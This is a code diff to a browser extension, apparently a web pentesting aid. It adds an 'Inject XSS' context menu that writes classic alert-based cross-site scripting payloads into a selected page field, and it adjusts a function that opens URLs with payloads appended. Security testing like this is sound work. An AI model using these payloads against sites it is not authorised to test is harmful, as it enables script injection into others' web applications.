@@ -78,6 +78,54 @@ chrome.contextMenus.onClicked.addListener((info, tab) => {
   }
 });
 
+const PAYLOADS = {
+  '<script>alert("XSS")</script>': `<script>alert("XSS")</script>`,
+  "<img src=x onerror=alert(document.domain)>": `<img src=x onerror=alert(document.domain)>`,
+  "<svg/onload=alert(1)>": `<svg/onload=alert(1)>`,
+  '"><script>alert(1)</script>': `"><script>alert(1)</script>`,
+  '"<h1>test</h1>': `"<h1>test</h1>`,
+};
+
+chrome.runtime.onInstalled.addListener(() => {
+  chrome.contextMenus.create({
+    id: "inject_xss",
+    title: "Inject XSS",
+    contexts: ["all"],
+  });
+
+  Object.entries(PAYLOADS).forEach(([label, payload], index) => {
+    chrome.contextMenus.create({
+      id: `payload_${index}`,
+      title: label,
+      parentId: "inject_xss",
+      contexts: ["all"],
+    });
+  });
+});
+
+chrome.contextMenus.onClicked.addListener((info, tab) => {
+  const payloadIndex = parseInt(info.menuItemId.split("_")[1]);
+  const payload = Object.values(PAYLOADS)[payloadIndex];
+
+  chrome.scripting.executeScript({
+    target: { tabId: tab.id },
+    func: (injection) => {
+      const el = window.__xssTarget;
+      if (!el) return alert("No element selected.");
+
+      if (["input", "textarea"].includes(el.tagName.toLowerCase())) {
+        el.value = injection;
+        el.dispatchEvent(new Event("input", { bubbles: true }));
+      } else if (el.isContentEditable) {
+        el.innerHTML = injection;
+      } else {
+        alert("Selected element is not editable.");
+      }
+    },
+    args: [payload],
+  });
+});
+
 chrome.contextMenus.onClicked.addListener((info, tab) => {
   if (info.menuItemId === "evaluate-url") {
     chrome.tabs.sendMessage(tab.id, {
@@ -103,11 +151,13 @@ function runPayloads(url, payloadsToRun) {
   let payloadsRan = 0;
 
   payloads.forEach((payload) => {
-    if (payloadsRan < payloadsToRun) {
-      let urlWithPayload = url + payload;
-      setTimeout(() => chrome.tabs.create({ url: urlWithPayload }), 1000);
-      payloadsRan++;
-    }
+    setTimeout(() => {
+      if (payloadsRan < payloadsToRun) {
+        let urlWithPayload = url + payload;
+        chrome.tabs.create({ url: urlWithPayload });
+        payloadsRan++;
+      }
+    }, 1000);
   });
 }
 
